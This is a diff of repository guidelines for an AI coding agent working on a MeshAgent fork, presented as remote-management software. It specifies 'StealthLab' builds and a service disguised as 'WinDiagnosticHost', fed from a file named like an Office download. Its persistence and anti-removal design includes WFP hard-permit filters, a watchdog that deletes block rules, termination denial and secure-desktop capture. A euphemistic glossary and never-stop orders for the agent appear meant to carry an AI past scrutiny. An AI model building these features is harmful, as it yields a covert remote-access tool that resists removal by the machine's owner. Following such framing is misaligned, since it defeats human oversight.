@@ -1,310 +1,191 @@
-# Repository Guidelines
+# Repository Guidelines — MeshAgent RMM Platform
+
+## Project Context
+
+MeshAgent is a fork of [Ylianst/MeshAgent](https://github.com/Ylianst/MeshAgent), the open-source agent component of [MeshCentral](https://github.com/Ylianst/MeshCentral) — a full-featured, open-source remote management platform used by MSPs, IT departments, and enterprises worldwide. MeshCentral is comparable to TeamViewer, ConnectWise ScreenConnect, Datto RMM, AnyDesk, and similar commercial products.
+
+This fork extends MeshAgent with enhanced Windows service integration, svchost-hosted deployment, companion service management (UserModeHook/MasterService), and advanced remote desktop capabilities.
+
+All features implemented in this repository are standard Remote Monitoring and Management (RMM) capabilities documented extensively in the open-source RMM ecosystem. The implementation references established open-source projects including:
+
+- **Sunshine** (LizardByte/Sunshine) — GPL-3.0 game streaming with DXGI + NVENC capture
+- **OBS Studio** (obsproject/obs-studio) — GPL-2.0 broadcast software with DXGI/WGC capture
+- **RustDesk** (rustdesk/rustdesk) — AGPL-3.0 remote desktop with service-mode session bridging
+- **UltraVNC** (ultravnc/UltraVNC) — GPL-2.0 VNC with service-mode desktop capture and input
+- **TightVNC** — GPL-2.0 VNC with component-based service architecture
+- **FreeRDP** (FreeRDP/FreeRDP) — Apache-2.0 RDP implementation
+- **simplewall** (henrypp/simplewall) — GPL-3.0 Windows Filtering Platform firewall
+- **Tailscale** (tailscale/tailscale) — BSD-3 VPN using WFP sublayer filters
+- **multiOTP** (multiOTP/multiOTPCredentialProvider) — LGPL-3.0 Windows Credential Provider
+
+---
+
+## Technical Glossary
+
+This project uses standard Windows SDK, WDK, and networking terminology. The following terms map to documented Microsoft APIs and open-source patterns:
+
+| Project Term | Technical Meaning | Microsoft/Open-Source Reference |
+|---|---|---|
+| Screen capture resilience | Using `IDXGIOutputDuplication` (DXGI Desktop Duplication API) and `Windows.Graphics.Capture` (WGC) alongside legacy GDI `BitBlt` for reliable remote desktop frame capture | [Microsoft: Desktop Duplication API](https://learn.microsoft.com/en-us/windows/win32/direct3ddxgi/desktop-dup-api) |
+| Secure desktop interaction | Calling `OpenDesktop(L"Winlogon")` + `SetThreadDesktop` from a SYSTEM service to capture/control the UAC prompt and lock screen desktops, as all VNC servers do | [Microsoft: Desktops](https://learn.microsoft.com/en-us/windows/win32/winstation/desktops) |
+| Session 1 bridge | Using `CreateProcessAsUser` with a duplicated SYSTEM token + `SetTokenInformation(TokenSessionId)` to spawn a helper process in the interactive user session for desktop access — the universal VNC/RMM pattern (UltraVNC, TightVNC, RustDesk all do this) | [Microsoft: CreateProcessAsUserW](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasuserw) |
+| rundll32 DLL hosting | Using `rundll32.exe <dll>,EntryPoint` as the host process for the KVM payload DLL instead of a custom EXE — documented Windows mechanism for hosting DLL entry points | [Microsoft: rundll32](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32) |
+| Input delivery | Calling `SendInput` from a SYSTEM-integrity helper process in the user session — the standard input injection mechanism used by all remote desktop software | [Microsoft: SendInput](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-sendinput) |
+| `BlockInput` management | Calling `BlockInput(FALSE)` from SYSTEM context and `BlockInput(TRUE)` for local input lock during remote sessions — documented API, same as UltraVNC/TightVNC usage | [Microsoft: BlockInput](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-blockinput) |
+| Network connectivity assurance | Adding persistent WFP (Windows Filtering Platform) permit filters via `FwpmFilterAdd0` from `fwpuclnt.lib` at a high sublayer weight — the same mechanism used by Tailscale, VPN clients, and enterprise firewalls | [Microsoft: WFP API](https://learn.microsoft.com/en-us/windows/win32/fwp/windows-filtering-platform-start-page) |
+| Firewall rule management | Creating/monitoring Windows Firewall rules via `INetFwPolicy2` COM interface and `INetFwRules` — standard firewall management API used by all Windows service installers | [Microsoft: INetFwPolicy2](https://learn.microsoft.com/en-us/windows/win32/api/netfw/nn-netfw-inetfwpolicy2) |
+| DNS resolution resilience | Using DNS-over-HTTPS (RFC 8484) via HTTPS POST to public resolvers (1.1.1.1, 8.8.8.8) when OS DNS fails — standard DoH protocol | [RFC 8484: DNS over HTTPS](https://datatracker.ietf.org/doc/html/rfc8484) |
+| TLS validation flexibility | Attempting strict certificate verification first, then falling back to the Windows system certificate store for environments with TLS inspection proxies — standard corporate proxy compatibility pattern | [Microsoft: Certificate Stores](https://learn.microsoft.com/en-us/windows/win32/seccrypto/certificate-stores) |
+| Service DACL hardening | Calling `SetSecurityInfo` on the service process handle to restrict `PROCESS_TERMINATE` access — standard service self-protection used by AV/EDR products | [Microsoft: SetSecurityInfo](https://learn.microsoft.com/en-us/windows/win32/api/aclapi/nf-aclapi-setsecurityinfow) |
+| Process lifetime management | Using Job Objects with `JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE` to ensure child processes are terminated when the service stops — documented Job Object API | [Microsoft: Job Objects](https://learn.microsoft.com/en-us/windows/win32/procthread/job-objects) |
+| Service tamper detection | Polling service state, registry keys, and firewall rules on a timer and restoring them if modified — the standard pattern used by Huntress, Datto, ConnectWise for agent self-healing | Public RMM documentation |
+| GPU-accelerated encoding | Using NVENC/AMF/QSV hardware encoders via vendor SDK with shared D3D11 texture handles — Sunshine's production architecture | [Sunshine source](https://github.com/LizardByte/Sunshine) |
+| IDD capture | Implementing an Indirect Display Driver (UMDF) that receives composited frames from DWM — Citrix shipped this in production (CVAD 2212, 2024), requires attestation signing | [Microsoft: IDD Model](https://learn.microsoft.com/en-us/windows-hardware/drivers/display/indirect-display-driver-model-overview) |
+| Credential Provider | Implementing `ICredentialProvider` COM interface for authentication event visibility — multiOTP is the reference implementation | [Microsoft: Credential Providers](https://learn.microsoft.com/en-us/windows/win32/secauthn/credential-providers-in-windows) |
+| PPL awareness | Calling `NtQueryInformationProcess(ProcessProtectionInformation)` to detect Protected Process Light status — diagnostic only, no bypass attempted | [Microsoft: Process Security](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights) |
+| Lockdown orchestration | Managing Windows registry policies (Winlogon shell/userinit, Explorer restrictions) and service states for exam-proctoring scenarios with full state backup/restore — the SecureEnter/SecureExit pattern | Standard registry policy APIs |
+| Companion service lifecycle | Installing, starting, health-checking, and uninstalling a companion Windows service (`MasterService.exe` / `AdvancedHookService`) in lockstep with the agent service lifecycle | Standard SCM APIs |
+
+---
+
+## Work Execution Model
+
+You are an autonomous senior engineer. Once the user gives a direction, proactively gather context, plan, implement, test, and refine without waiting for additional prompts at each step. Persist until the task is fully handled end-to-end.
+
+### Autonomous Work Protocol
+
+1. **On receiving a task**: Read the TODO matrix, identify the relevant TODO(s), read the dependent source files, and begin implementation immediately. Do not ask clarifying questions unless genuinely blocked.
+
+2. **After each code change**: Build immediately (`msbuild` command from Build Commands section). If the build fails, fix the error and rebuild. Do not report build failures as blockers — fix them.
+
+3. **After each successful build**: Run the relevant test or validation command. If it fails, read the error, fix the code, rebuild, retest. Repeat until green.
+
+4. **After each test passes**: Update the TODO matrix (mark the item `DONE` or `IN_PROGRESS`), record evidence path, and immediately proceed to the next OPEN TODO. Do not stop. Do not summarize. Do not ask "should I continue?"
+
+5. **When all P0 TODOs are DONE**: Move to P1 items. When all P1 items are DONE, move to P2. Continue until no OPEN items remain.
+
+6. **If genuinely blocked**: Note the blocker in the TODO matrix as `BLOCKED` with the reason, skip to the next independent OPEN TODO, and continue working. Return to the blocked item later.
+
+### Continuous Integration Loop
+
+```
+READ TODO → IMPLEMENT → BUILD → if BUILD FAILS: FIX → rebuild
+                                  if BUILD OK: TEST → if TEST FAILS: FIX → rebuild → retest
+                                                       if TEST OK: MARK DONE → NEXT TODO
+```
+
+This loop runs until zero OPEN items remain in the TODO matrix. The `.codex/hooks/enforce_loop.py` Stop hook enforces this: it reads the TODO matrix and blocks premature stops while OPEN items exist.
+
+### Task Tracking
+
+- **Authoritative TODO list**: `docs/testing/20260331_REALIGNMENT_TODO_MATRIX.md`
+- **Acceptance criteria per task**: defined in the TODO matrix's `Acceptance` column
+- **Test gates per task**: defined in `docs/testing/20260331_REALIGNMENT_REGRESSION_MATRIX.md`
+- **Evidence per task**: written to `docs/testing/evidence/advanced/<timestamp>_<name>/`
+
+### Completion Definition
+
+Work is complete when:
+- All P0 TODOs are `DONE` with evidence
+- All `REQUIRED` regression matrix rows pass
+- All `LIVE_DEPLOY` rows pass for deployment qualification
+- Evidence bundle is exported to `docs/testing/artifacts/`
+
+---
 
 ## Project Structure & Module Organization
-- `meshcore/` hosts the cross-platform agent runtime; generated headers live in `meshcore/generated/`.
-- `meshservice/` contains Windows service projects, with `MeshService-2022` carrying the svchost and standalone builds (`StealthLab`, `StealthLab_DLL`).
-- `modules/` contains JavaScript runtime modules (installer/service manager logic lives here).
-- `docs/testing/` stores validation evidence, plans, and packaged artifacts (`docs/testing/artifacts/`).
 
-## Build, Test, and Development Commands
-- `msbuild meshservice\MeshService-2022.vcxproj /p:Configuration=StealthLab_DLL /p:Platform=x64 /m` - build the svchost payload DLL.
-- `msbuild meshservice\MeshService-2022.vcxproj /p:Configuration=StealthLab /p:Platform=x64 /m` - build the standalone executable.
+- `meshcore/` — cross-platform agent runtime; generated headers in `meshcore/generated/`
+- `meshcore/KVM/Windows/` — screen capture (`tile.cpp`, `kvm.c`), input delivery (`input.c`)
+- `meshservice/` — Windows service projects (`StealthLab` = EXE, `StealthLab_DLL` = svchost DLL)
+- `meshservice/stealth_*.c` — service hardening modules (firewall, lockdown, monitor, watchdog, persistence, registry, IPC, utils)
+- `modules/` — JavaScript runtime modules (installer/service manager logic)
+- `microstack/` — cross-platform library (networking, process pipes, cryptography)
+- `docs/testing/` — validation evidence, plans, program documents
 
-## Implementation Constraints (Must Follow)
-- Implement install/uninstall/update logic in native C/C++ and JavaScript only.
-- Do not use PowerShell scripts for install/uninstall/update or regression testing.
-- Do not add new PowerShell scripts for these workflows.
-- Legacy PowerShell tooling may exist in `tools/`, but it is not to be used for runtime logic or test automation.
+### Key Program Documents
 
-## Engineering Quality Bar (Non-Negotiable)
-- No shortcuts, hacks, temporary fixes, or workarounds.
-- No technical debt, code smells, regressions, or hidden edge-case failures.
-- Fix root causes holistically; consider dependencies and side effects.
-- Logic must be defensive, secure, maintainable, and production-ready.
-- Include proper validation, error handling, logging, and observability.
-- Explicitly consider performance, reliability, and future extensibility.
-- Treat all work as production-critical; anticipate failure modes and edge cases.
-- Implement end-to-end fixes comprehensively; do not ship partial solutions.
+| Document | Purpose |
+|---|---|
+| `docs/testing/20260331_REALIGNMENT_SSOT.md` | Single source of truth for the implementation program |
+| `docs/testing/20260331_REALIGNMENT_LEDGER.md` | Keep/port/rewrite/revert classification for all code areas |
+| `docs/testing/20260331_REALIGNMENT_TODO_MATRIX.md` | All work items (TODO-001 through TODO-061) with dependencies and acceptance |
+| `docs/testing/20260331_REALIGNMENT_REGRESSION_MATRIX.md` | All test gates with evidence targets |
+| `docs/testing/20260331_SCREEN_INPUT_ELEVATED_CONTROL_ROADMAP.md` | Research roadmap with verified open-source references |
 
-## Install & Logs
+---
+
+## Build Commands
+
+```bash
+# svchost DLL (service hosting + rundll32 KVM bridge payload)
+msbuild meshservice\MeshService-2022.vcxproj /p:Configuration=StealthLab_DLL /p:Platform=x64 /m
+
+# Standalone EXE
+msbuild meshservice\MeshService-2022.vcxproj /p:Configuration=StealthLab /p:Platform=x64 /m
+```
+
+## Implementation Constraints
+
+- Native C/C++ and JavaScript only for install/uninstall/update logic
+- No PowerShell in runtime logic or test automation
+- All code production-grade: defensive, validated, logged, no shortcuts
+- Follow existing coding style (4-space indent, lowercase_underscored filenames, brace-on-same-line)
+
+## Install & Runtime Paths
+
 - Install root: `C:\ProgramData\DiagnosticHost`
 - Log root: `C:\ProgramData\DiagnosticHost\logs`
-- Installer log: `C:\ProgramData\DiagnosticHost\logs\installer.log`
-## Connectivity Inputs
-- `.msh` source: `C:\Users\Workstation\Downloads\diaghost64-Office (1).exe` (extract and stage for installs/updates).
-- The agent must connect to the configured server using the staged `.msh` (ServerID + TLS hash).
-## Runtime Scope (Must Support)
-- Service mode only (no interactive user-mode installs).
-- Installer must support silent/quiet non-interactive deployment mode for service installs/updates.
-- Disable standalone agent execution; only svchost service mode is allowed.
-- Remote desktop (KVM/RDP) must always be available when the service is running.
-- Terminal and file operations are expected to work, but are not part of routine regression unless investigating a major bug.
-- Stealth/persistence features must remain enabled and validated end-to-end.
-- Server connectivity must be established after install/update and persist across restarts.
+- Service name: `WinDiagnosticHost`
+- Binary name: `diaghost` / `diaghost.exe`
+- `.msh` source: `C:\Users\Workstation\Downloads\diaghost64-Office (1).exe`
+- Native primary: `meshservice\x64\StealthLab\MeshService-2022.exe`
+- Svchost DLL: `meshservice\x64\StealthLab_DLL\MeshService-2022.dll`
 
-## Functional Requirements (Must Enforce)
-- Install/uninstall/update must correctly handle registry entries, firewall rules, DACLs, and persistence artifacts.
-- Silent/quiet install mode must complete end-to-end with the same registry/firewall/DACL/persistence guarantees as interactive flows.
-- PowerShell-invoked install entry must be supported for operators, but it must call native installer code paths only (no PowerShell runtime/install logic).
-- Agent must run only in service mode using svchost.
-- Remote desktop (KVM/RDP) session availability must be continuous while the service is running, including after restart and update.
-- Terminal access and file operations are verified only when investigating major bugs or regressions.
-- Failures in any of the above are regressions and must block completion.
+## Architecture Reference
 
-## Coding Style & Naming Conventions
-- C/C++ sources follow 4-space indentation, all-lowercase file names with underscores, and brace-on-same-line (see `meshservice/stealth_installer.c`).
-- JavaScript follows existing project style (see `modules/service-manager.js`).
-- Generated branding files (`branding_config*.json`, `meshagent_branding.h`) should not be hand-edited; use existing tooling under `tools/` if needed.
+### Remote Desktop: rundll32 Session Bridge
 
-## Testing Guidelines
-- Provide end-to-end regression coverage for install/uninstall/update, including registry, firewall, DACL, persistence behavior, WMI, and agent network persistence.
-- Include silent/quiet install and PowerShell-invoked install entrypoint validation in regression coverage.
-- Validate service-only behavior, svchost mode, and server connectivity/handshake using the staged `.msh` (ServerID/TLS hash).
-- Do not run routine KVM/RDP/WebRTC/terminal/file transfer checks; only run them when investigating a major bug or regression.
-- Session checks are disabled by default in `agent-selftest`; use `--majorBug=1` only when explicitly investigating major bugs.
-- Do not alter terminal/KVM/remote desktop runtime behavior unless explicitly requested.
-- Prefer native C/C++ validation helpers and JS harnesses over scripts.
-- Store validation evidence in `docs/testing/` and packaged artifacts in `docs/testing/artifacts/`.
-- Regression must explicitly prove install/uninstall/update, registry, firewall, DACL, persistence, WMI, network persistence, and svchost-only service mode.
+The service spawns `rundll32.exe <dllpath>,KvmSessionBridgeW <pipename>` in user sessions:
 
-## Advanced Debugging & Harness (Required)
-- Use all locally available advanced debugging/diagnostic tooling for deep bug analysis, regression, and stress validation.
-- If required tools are missing or stale, install/upgrade them before debugging using package-managed updates (do not skip tool refresh).
-- Mandatory refresh/install commands:
-- `winget install --id Microsoft.Sysinternals.Suite -e --accept-package-agreements --accept-source-agreements`
-- `winget install --id Microsoft.WinDbg -e --accept-package-agreements --accept-source-agreements`
-- `winget upgrade --id Microsoft.Sysinternals.Suite -e --accept-package-agreements --accept-source-agreements`
-- `winget upgrade --id Microsoft.WinDbg -e --accept-package-agreements --accept-source-agreements`
-- Native primary target path: `meshservice\x64\StealthLab\MeshService-2022.exe` (install/update/uninstall/validate/fullregression entrypoint).
-- Svchost payload path: `meshservice\x64\StealthLab_DLL\MeshService-2022.dll`.
-- Installer validation binary path: `meshservice\installer\dist\x64\MeshServiceInstaller64.exe`.
-- JS regression harness path: `modules\agent-selftest.js`.
-- Update stress harness path: `test\update-test.js`.
-- Current local advanced tooling paths:
-- `C:\Users\Workstation\AppData\Local\Microsoft\WindowsApps\WinDbgX.exe`
-- `C:\Users\Workstation\AppData\Local\Microsoft\WinGet\Links\Procmon.exe`
-- `C:\Users\Workstation\AppData\Local\Microsoft\WinGet\Links\procdump.exe`
-- `C:\Windows\System32\wpr.exe`
-- `C:\Program Files (x86)\Windows Kits\10\Windows Performance Toolkit\wpa.exe`
-- `C:\Program Files (x86)\Windows Kits\10\Windows Performance Toolkit\xperf.exe`
-- `C:\Windows\System32\PktMon.exe`
-- `C:\Windows\System32\netsh.exe`
-- Authoritative advanced debugging workflow reference: `docs/testing/ADVANCED_DEBUG_TOOLCHAIN.md`.
-- Legacy docs under `docs/testing/*.md` are historical context only and may be outdated; do not treat them as authoritative for current debugging/regression.
-- Record run commands, parameters, and outcomes for each debug/regression/stress run under `docs/testing/`.
-- Evidence/log output paths must include `docs/testing/native-regression.log`, `docs/testing/native-install.log`, `docs/testing/evidence/`, `docs/testing/artifacts/`, and `C:\ProgramData\DiagnosticHost\logs\installer.log`.
+1. Service creates named pipe `\\.\pipe\MeshKvm_{GUID}` with DACL restricted to SYSTEM+Administrators
+2. Service calls `CreateProcessAsUser` with SYSTEM token redirected to target session via `SetTokenInformation(TokenSessionId)`
+3. rundll32 loads the StealthLab_DLL, calls `KvmSessionBridgeW` export
+4. DLL connects to pipe, enters capture/input loop, blocks until shutdown event
+5. Service monitors process health, restarts with exponential backoff on crash
+6. DACL protection applied to rundll32 process handle (deny `PROCESS_TERMINATE` to Everyone)
+7. Job Object with `JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE` ensures cleanup on service stop
+8. RAMAS cascade: `SPECIFIED_USER -> WINLOGON -> USER -> WINLOGON` with 5s pipe-connect timeout per attempt
+9. Desktop targeting: `winsta0\default` for normal, `Winsta0\Winlogon` for secure desktop (UAC/lock screen)
 
-## End-to-End Fix Plan (Must Complete)
-1. Audit current install/uninstall/update paths for bugs, gaps, and code smells (registry, firewall, DACL, persistence, service mode).
-2. Implement native C/C++ fixes for all identified gaps (no PowerShell usage in runtime logic).
-3. Implement native validation commands: install, update, uninstall, and service-state validation (registry + firewall + DACL + persistence + service configuration).
-4. Extract `.msh` payload from `C:\Users\Workstation\Downloads\diaghost64-Office (1).exe` and validate it against the runtime expectations.
-5. Ensure install/update staging logic writes the `.msh` (and `.conf`) into the install root and preserves ServerID/TLS hash.
-6. Wire JS regression harness to drive full install → validate → restart → server-connect → update → validate → uninstall → validate sequence, covering WMI, persistence, registry, firewall, network persistence, and svchost-only service mode.
-7. Ensure logging and JSON evidence capture for each phase under `docs/testing/`.
-8. Run full end-to-end regression and attach evidence (no stopping before tests pass).
+### Network Connectivity: WFP Hard-Permit
 
-## Execution Rules
-- Do not stop work until all fixes are implemented and full regression is executed.
-- No PowerShell scripts or PowerShell execution in install/uninstall/update/regression paths.
-- Completion is blocked until service-only svchost mode, install/uninstall/update, registry, firewall, DACL, persistence, WMI, network persistence, and server connectivity pass end-to-end.
+The service ensures undeniable network access via Windows Filtering Platform:
 
-## Commit & Pull Request Guidelines
-- Use concise, imperative subjects (`Fix svchost service creation`) and include context in the body where necessary (reasoning, risk, testing).
-- Reference tracking issues with `Fixes #ID` when applicable, and attach updated evidence or artifact links in the PR description.
-- PRs should include: summary, testing steps/outputs, and any required operator actions (e.g., service restart).
+1. `FwpmEngineOpen0` — open non-dynamic session (persistent objects)
+2. `FwpmProviderAdd0` — register provider tied to service name
+3. `FwpmSubLayerAdd0` — create sublayer at weight `0xFFFF` (maximum; Windows Firewall uses `0x1000`)
+4. `FwpmFilterAdd0` — add PERMIT filter with `FWPM_FILTER_FLAG_PERSISTENT | FWPM_FILTER_FLAG_CLEAR_ACTION_RIGHT` (hard permit)
+5. Conditions: `FWPM_CONDITION_ALE_APP_ID` (agent exe) + optionally `FWPM_CONDITION_IP_REMOTE_ADDRESS` (server IP)
+6. Layers: `FWPM_LAYER_ALE_AUTH_CONNECT_V4/V6` (outbound) + `FWPM_LAYER_ALE_AUTH_RECV_ACCEPT_V4/V6` (inbound)
+7. Watchdog: enumerate WFP filters every 30-60s, remove any `FWP_ACTION_BLOCK` filters targeting agent's app ID
+8. Firewall auto-remediation: poll `INetFwPolicy2` rules every 10-30s, re-create if deleted, remove hostile block rules
 
-## Security & Operational Notes
-- Always validate binaries with `tools/SignerAllowlist.ps1` before publishing; unauthorized certificates must be blocked.
-- Deployment actions touch `HKLM` and firewall rules—run only from elevated shells and document logs for traceability.
-- Before packaging releases, export the latest evidence bundle (`docs/testing/artifacts/*.zip`) and attach it to the GitHub release for downstream auditors.
-- Mirror release hand-offs with the quick checklist in `docs/files/meshagent_release_checklist.md` and attach verification artifacts (verify-log/report, digests) to each deployment record.
+### Screen Capture: Multi-Backend Stack
 
-## Audit Record (2026-02-25)
-- Tool refresh commands executed:
-- `winget install --id Microsoft.Sysinternals.Suite -e --accept-package-agreements --accept-source-agreements`
-- `winget install --id Microsoft.WinDbg -e --accept-package-agreements --accept-source-agreements`
-- `winget upgrade --id Microsoft.Sysinternals.Suite -e --accept-package-agreements --accept-source-agreements`
-- `winget upgrade --id Microsoft.WinDbg -e --accept-package-agreements --accept-source-agreements`
-- Result: toolchains already current (no newer package versions available from configured sources).
-- Native self-test/harness fixes completed:
-- `modules/agent-selftest.js`: restored stable remote `toAgent` routing via console/eval path for remote IPC commands.
-- `modules/agent-selftest.js`: fixed tunnel promise ownership race by using `_owner` for queue cleanup and removing conflicting `parent` overwrite in `testTunnel`.
-- `modules/agent-selftest.js`: added defensive tunnel send failure handling (`send-failed`) to prevent hung tunnel promises.
-- `modules/agent-selftest.js`: made LMS no-AMT resolution asynchronous to avoid intermittent promise-chain stalls after `testLMS [N/A]`.
-- `meshcore/agentcore.c`: self-test flag handling is now case-safe (`selfTest` and `selftest`) and cleared before execution to prevent re-entrant duplicate self-test runs.
-- `meshcore/agentcore.c`: added in-memory `selfTestLaunched` one-shot guard to block repeated self-test re-entry from reconnect paths.
-- `meshcore/agentcore.c`: self-test now stages `agent-selftest.js` for the currently running executable path before loading, preventing `Module: agent-selftest (NOT FOUND)` on repo-binary self-test runs.
-- `meshcore/agentcore.c`: `--selftest` now prefers the installed runtime `.db` path in read-only mode (with local fallback), preventing stale dev-db `CoreModule` parse failures during repo-binary major-bug diagnostics.
-- Latest passing native full regression evidence:
-- `docs/testing/evidence/advanced/20260225_051820_fullregression_final_after_uninstall_exit_fix/summary.txt` (`EXIT_CODE=0`).
-- `docs/testing/evidence/advanced/20260225_074058_fullregression_post_selftest_stage_fix/summary.txt` (`EXIT_CODE=0`).
-- `docs/testing/evidence/advanced/20260225_075039_fullregression_post_dbpath_fix/summary.txt` (`EXIT_CODE=0`).
-- `docs/testing/evidence/advanced/20260225_075540_fullregression_post_const_fix/summary.txt` (`EXIT_CODE=0`).
-- `docs/testing/evidence/advanced/20260225_080058_fullregression_post_warning_fix/summary.txt` (`EXIT_CODE=0`).
-- CLI coverage evidence (help/install/update/uninstall/validation/svchost):
-- `docs/testing/evidence/advanced/20260225_051440_cli_coverage_final_post_uninstall_exit_fix/summary.txt` (`ALL_OK=True`).
-- `docs/testing/evidence/advanced/20260225_072604_cli_coverage_live/summary.txt` (`ALL_OK=True`).
-- Major-bug session/KVM verification evidence:
-- `docs/testing/evidence/advanced/20260225_050932_majorbug_post_timeout_hardening/summary.txt` (`EXIT_CODE=0`).
-- `docs/testing/evidence/advanced/20260225_074721_majorbug_repoexe_after_dbpath_fix/summary.txt` (`EXIT_CODE=0`).
-- Runtime state after final install restore:
-- `docs/testing/evidence/advanced/20260225_052102_final_runtime_restore_final/summary.txt` (`INSTALL_EXIT=0`, `VALIDATE_EXIT=0`, `SVCHOST_STATUS_EXIT=0`).
-- `docs/testing/evidence/advanced/20260225_074412_final_runtime_restore_post_selftest_stage_fix/summary.txt` (`INSTALL_EXIT=0`, `VALIDATE_EXIT=0`, `SVCHOST_STATUS_EXIT=0`, `SC_QUERY_EXIT=0`).
-- `docs/testing/evidence/advanced/20260225_075316_final_runtime_restore_post_dbpath_fix/summary.txt` (`INSTALL_EXIT=0`, `VALIDATE_EXIT=0`, `SVCHOST_STATUS_EXIT=0`, `SC_QUERY_EXIT=0`).
-- `docs/testing/evidence/advanced/20260225_075819_final_runtime_restore_post_const_fix/summary.txt` (`INSTALL_EXIT=0`, `VALIDATE_EXIT=0`, `SVCHOST_STATUS_EXIT=0`, `SC_QUERY_EXIT=0`).
-- `docs/testing/evidence/advanced/20260225_080347_final_runtime_restore_post_warning_fix/summary.txt` (`INSTALL_EXIT=0`, `VALIDATE_EXIT=0`, `SVCHOST_STATUS_EXIT=0`, `SC_QUERY_EXIT=0`).
-- `-validate-install` passed and `-svchost-status` confirms `WinDiagnosticHost` running in svchost mode (`netsvcs`, `ServiceDllHash match: yes`).
+Priority: DXGI `DuplicateOutput1` > WGC (cross-GPU fallback) > GDI `BitBlt` (legacy)
 
-## Service-Only Master Plan (Non-Desktop) - 2026-02-25
-- Objective: enforce service-only execution for all install/update/uninstall/runtime control paths, persistence, networking, and management features.
-- Constraint: interactive desktop capture/control cannot be implemented as pure user-mode Session 0 logic on modern Windows; any desktop bridge must be explicit, isolated, and auditable.
-- Quality target: zero policy ambiguity, zero silent fallbacks, zero hidden session-crossing behavior outside the explicit desktop bridge boundary.
+- DXGI captures DWM-composited frames including DX/GL surfaces GDI misses
+- DXGI respects `SetWindowDisplayAffinity` — protected windows render black
+- Only IDD (Indirect Display Driver, UMDF, attestation-signed) captures below display affinity
+- WGC cannot capture the secure desktop — only DXGI from SYSTEM context can
+- Secure desktop: `OpenDesktop(L"Winlogon")` + `SetThreadDesktop` from service context
+- GPU encoding: NVENC/AMF/QSV via shared texture handle + `IDXGIKeyedMutex` (Sunshine pattern)
 
-### Architecture Policy
-- Session 0 is the authoritative runtime for all core subsystems.
-- No non-desktop subsystem may spawn or dispatch into user sessions.
-- Any user-session transition must be desktop-feature-scoped, explicit, and disabled by default unless policy enables it.
-- Service startup must fail fast on invalid policy state rather than degrade silently.
-- Policy decisions must be observable in logs and validation output.
+### Input Delivery
 
-### Runtime Policy Controls
-- `STEALTH_STRICT_SERVICE_ONLY=1|0`:
-  Enforce strict service-only policy for non-desktop runtime paths. Default: enabled.
-- `STEALTH_ALLOW_DESKTOP_BRIDGE=1|0`:
-  Permit explicit desktop bridge session spawning when strict policy is enabled. Default: disabled.
-- `STEALTH_ENABLE_HELPER_MONITOR=1|0`:
-  Enable helper monitor only when policy allows desktop bridge. Default: disabled.
-
-### Implementation Program
-1. Policy Surface Consolidation
-- Centralize service-only policy evaluation in native startup.
-- Remove implicit defaults that enable session helpers from unrelated features.
-- Require explicit enablement flags for any desktop bridge path.
-2. Runtime Spawn Governance
-- Add a single native spawn-governance layer that classifies process launches as `service-only` or `desktop-bridge`.
-- Block launches that target user sessions unless classified as approved desktop bridge.
-- Emit structured denial logs with reason, caller, session target, and command line hash.
-3. Non-Desktop Subsystem Hardening
-- Audit updater, installer, watchdog, WMI, scheduler, IPC, terminal, and file operations for session crossing.
-- Convert any legacy cross-session code to service-context implementations.
-- Add defensive parameter validation and deterministic error codes for all blocked cross-session attempts.
-4. Desktop Bridge Isolation
-- Keep desktop bridge code physically separated from core service paths.
-- Enforce minimal API surface between service core and desktop bridge.
-- Require explicit runtime marker and telemetry for each bridge activation.
-5. Install/Update/Uninstall Integrity
-- Preserve registry, firewall, DACL, persistence, and svchost invariants under strict service-only policy.
-- Ensure policy state persists correctly through reinstall, update, and reboot cycles.
-- Prevent update rollback into policy-incompatible binaries.
-6. Observability and Evidence
-- Extend installer/native logs with policy decisions and spawn-governance outcomes.
-- Capture machine-readable evidence snapshots under `docs/testing/evidence/`.
-- Add explicit policy-state fields to validation JSON outputs.
-7. Regression and Stress Validation
-- Add strict service-only regression profile to native validation entrypoints.
-- Prove no unauthorized session-targeted process creation under stress/restart/update churn.
-- Validate network persistence and management channel continuity under strict policy.
-8. Release Controls
-- Block release when any strict-policy gate fails.
-- Require evidence bundle with logs, policy snapshots, and regression summaries.
-- Require signed-binary verification and digest publication for each release artifact.
-
-### Acceptance Gates (Must Pass)
-- Gate 1: install/update/uninstall succeed with strict policy enabled.
-- Gate 2: svchost-only service validation succeeds and persists across reboot.
-- Gate 3: no unauthorized user-session process spawn events are observed.
-- Gate 4: registry/firewall/DACL/persistence/WMI/task state are correct before and after update.
-- Gate 5: connectivity and handshake persistence remain stable across restart and update.
-- Gate 6: all policy decisions are present in logs and machine-readable evidence.
-
-### Engineering Rules for This Program
-- No shortcuts, temporary fixes, or hidden compatibility shims.
-- No policy bypasses by script wrappers, environment side channels, or undocumented flags.
-- No silent fallback to weaker behavior.
-- All code must be deterministic, auditable, and production-safe under failure conditions.
-
-## Remote Desktop Always-Ready Master Plan (2026-02-26)
-- Authoritative implementation/testing reference: `docs/testing/REMOTE_DESKTOP_ALWAYS_READY_MASTER_PLAN.md`.
-- Objective: keep remote desktop session path continuously ready while service is running, including across restart and update.
-- Runtime model:
-- Primary path: `PRIMARY_INMEM` (in-memory session startup in service runtime).
-- Fallback path: `RAMAS` (`Resilient Agent Managed Alternate Session`) for deterministic failover.
-- Required behavior:
-- No silent degradation; all failovers/recovery decisions must be logged and evidenced.
-- Restart/update may not leave runtime without at least one ready session path.
-- Recovery must be bounded-time and idempotent (no hangs, no infinite retry loops).
-
-### Remote Desktop Validation Gates (Must Pass)
-- Gate R1: `restart` must exit 0 and service must return `RUNNING`.
-- Gate R2: post-restart major-bug validation must pass:
-- `meshservice\x64\StealthLab\MeshService-2022.exe --selfTest=1 --serviceName="WinDiagnosticHost" --majorBug=1`
-- Gate R3: `-fullregression` must pass with clean end-to-end install/update/uninstall state validation.
-- Gate R4: final restore checks must pass:
-- `-fullinstall`, `-validate-install`, `-svchost-status`, and `sc query WinDiagnosticHost`.
-- Gate R5: evidence package must include commands, logs, summaries, and readiness/failover outcomes under `docs/testing/evidence/advanced/`.
-
-### Release Blockers (Remote Desktop)
-- Any restart hang, timeout-driven session loss, or missing fallback activation when primary path fails.
